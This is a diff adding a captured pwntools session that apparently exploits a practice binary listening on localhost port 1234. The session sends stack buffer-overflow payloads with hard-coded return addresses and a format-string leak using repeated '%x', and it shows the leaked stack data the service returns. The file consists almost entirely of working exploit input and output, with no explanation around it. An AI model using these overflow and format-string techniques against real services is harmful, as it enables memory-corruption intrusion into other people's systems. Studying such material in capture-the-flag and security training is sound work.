@@ -1,0 +1,16 @@
+>>> proc.write(88*b"\x00" + b"\x3b\x12\x40\x00\x00\x00\x00\x00" + b"\x30\xf6\xc8\xf7\xff\x7f\x00\x00" + b"\xa4\x11\x40\x00\x00\x00\x00\x00" + b"\n")
+
+>>> proc = remote("localhost", 1234)
+[x] Opening connection to localhost on port 1234
+[x] Opening connection to localhost on port 1234: Trying ::1
+[+] Opening connection to localhost on port 1234: Done
+>>> proc.write(b"\x00" + 43*b"%x" + b"\x00" + b"\x3b\x12\x40\x00\x00\x00\x00\x00" + b"\x52\xe4\xff\xff\xff\x7f\x00\x00" + b"\x6d\x11\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.read
+<bound method tube.make_wrapper.<locals>.wrapper of <pwnlib.tubes.remote.remote object at 0x7f20da99cbd0>>
+>>> proc.read()
+b'\x1b[36mpls gief inpt: \x1b[33m'
+>>> proc.read()
+b'\x1b[0mx6d305b1bffffe4500405321040000affffe5b8ffffe5b8dee85bc00ffffe5c80f7ffd020178a5bc09c6e5bc00000ffffe5b8c9902a00df7de22454011620000401080ffffe5b0004010aaffffe5a8381ffffe9030ffffe90affffe96cffffe98fffffe9a1'
+>>> 
+
+
